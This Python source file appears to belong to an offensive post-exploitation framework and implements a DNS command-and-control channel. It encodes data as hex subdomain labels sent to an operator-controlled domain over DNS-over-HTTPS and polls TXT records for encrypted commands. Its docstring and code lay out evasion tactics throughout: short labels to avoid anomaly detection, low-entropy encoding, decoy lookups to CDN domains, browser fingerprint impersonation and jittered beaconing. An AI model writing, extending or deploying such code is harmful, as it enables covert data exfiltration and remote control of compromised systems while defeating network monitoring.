"""
forge/utils/post/channels/dns_channel.py
DNS C2 channel backend — Module 5-G.

Data transport via DNS TXT record lookups (receive) and A record queries (send).
All queries routed through DNS-over-HTTPS (DoH) to resist passive DNS logging.

OPSEC constraints:
  - DNS labels limited to ≤ 40 chars to avoid anomaly detection on long subdomains.
  - Data encoded as hex pairs split by dots: ab.cd.ef.domain.com (not base64 — entropy).
  - Cover traffic: 1 legitimate CDN A-record lookup per 3 beacon queries.
  - DoH endpoint: https://1.1.1.1/dns-query (Cloudflare) via curl_cffi Chrome fingerprint.
  - No raw command strings in DNS labels.
  - FORGE_OFFLINE_STRICT=1 disables all queries.
"""

from __future__ import annotations

import base64
import hashlib
import logging
import os
import random
import time
from typing import Optional

_LOG = logging.getLogger(__name__)
_OFFLINE = os.getenv("FORGE_OFFLINE_STRICT", "").lower() in ("1", "true", "yes")

_DOH_URL = "https://1.1.1.1/dns-query"
_MAX_LABEL = 40  # chars per DNS label
_COVER_RATIO = 3  # 1 cover query per N beacon queries
_COVER_DOMAINS = [  # legitimate CDN domains for cover traffic
    "cdn.cloudflare.com",
    "ajax.googleapis.com",
    "cdnjs.cloudflare.com",
    "fonts.gstatic.com",
]


class DNSChannel:
    """
    DNS-over-HTTPS C2 channel. Data encoded as hex subdomain labels.

    Args:
        c2_domain:   Operator-controlled DNS zone (e.g., c2.example.com).
        session_key: 32-byte AES-256-GCM key (hex).
        interval:    Base poll interval seconds.
        jitter_pct:  Gaussian jitter percentage.
    """

    def __init__(
        self,
        c2_domain: str,
        session_key: str = "REPLACE_BEFORE_DEPLOY_32_BYTE_KEY",
        interval: int = 120,
        jitter_pct: int = 25,
    ) -> None:
        self._domain = c2_domain
        self._key = bytes.fromhex(session_key) if len(session_key) == 64 else None
        self._interval = interval
        self._jitter_pct = jitter_pct
        self._query_count = 0
        self._session = self._make_doh_session()

    # ── Public interface ───────────────────────────────────────────────────────

    def send(self, data: bytes) -> bool:
        """Encode data as hex labels and send via DNS A-record queries."""
        if _OFFLINE:
            return False
        encrypted = self._encrypt(data)
        labels = self._encode_labels(encrypted)
        success = False
        for label_chunk in labels:
            fqdn = f"{label_chunk}.{self._domain}"
            if self._doh_query(fqdn, "A"):
                success = True
            self._maybe_cover_query()
            time.sleep(0.5)
        return success

    def recv(self, timeout: int = 30) -> Optional[bytes]:
        """Poll for commands via DNS TXT record on c2_domain."""
        if _OFFLINE:
            return None
        self._maybe_cover_query()
        fqdn = f"cmd.{self._domain}"
        txt = self._doh_query(fqdn, "TXT")
        if not txt:
            return None
        try:
            return self._decrypt(base64.b64decode(txt))
        except Exception:
            return None

    def sleep(self) -> None:
        sigma = self._interval * (self._jitter_pct / 100)
        actual = max(10.0, random.gauss(self._interval, sigma))
        time.sleep(actual)

    def close(self) -> None:
        try:
            self._session.close()
        except Exception:
            pass

    # ── Internal ──────────────────────────────────────────────────────────────

    @staticmethod
    def _encode_labels(data: bytes) -> list[str]:
        """
        Encode bytes as dotted hex labels, each ≤ 40 chars.
        e.g. b'\\xde\\xad\\xbe\\xef' → ['dead.beef']
        Returns list of label-chunk strings (each usable as a subdomain prefix).
        """
        hex_str = data.hex()
        # Split into pairs, then group into label-sized chunks
        pairs = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
        chunks: list[str] = []
        buf: list[str] = []
        length = 0
        for pair in pairs:
            if length + len(pair) + 1 > _MAX_LABEL:
                chunks.append(".".join(buf))
                buf = [pair]
                length = len(pair)
            else:
                buf.append(pair)
                length += len(pair) + 1
        if buf:
            chunks.append(".".join(buf))
        return chunks

    def _doh_query(self, fqdn: str, qtype: str) -> Optional[str]:
        """Issue a DoH query. Returns first answer value or None."""
        self._query_count += 1
        try:
            resp = self._session.get(
                _DOH_URL,
                params={"name": fqdn, "type": qtype},
                headers={"Accept": "application/dns-json"},
                timeout=10,
            )
            if resp.status_code != 200:
                return None
            data = resp.json()
            answers = data.get("Answer", [])
            if answers:
                return answers[0].get("data", "").strip('"')
        except Exception as exc:
            _LOG.debug("DoH query failed (%s %s): %s", qtype, fqdn, exc)
        return None

    def _maybe_cover_query(self) -> None:
        """Issue a legitimate CDN lookup every _COVER_RATIO queries."""
        if self._query_count % _COVER_RATIO == 0:
            cover = random.choice(_COVER_DOMAINS)
            self._doh_query(cover, "A")

    def _encrypt(self, data: bytes) -> bytes:
        if not self._key:
            return data
        try:
            from Crypto.Cipher import AES
            from Crypto.Random import get_random_bytes

            nonce = get_random_bytes(12)
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            ct, tag = cipher.encrypt_and_digest(data)
            return nonce + tag + ct
        except ImportError:
            return data

    def _decrypt(self, raw: bytes) -> Optional[bytes]:
        if not self._key or len(raw) < 28:
            return raw
        try:
            from Crypto.Cipher import AES

            nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
            cipher = AES.new(self._key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct, tag)
        except Exception:
            return None

    @staticmethod
    def _make_doh_session():
        try:
            from curl_cffi import requests as cffi_requests

            return cffi_requests.Session(impersonate="chrome122")
        except ImportError:

            class _NoOp:
                def get(self, *a, **kw):
                    return type("R", (), {"status_code": 0, "json": lambda: {}})()

                def close(self):
                    pass

            return _NoOp()
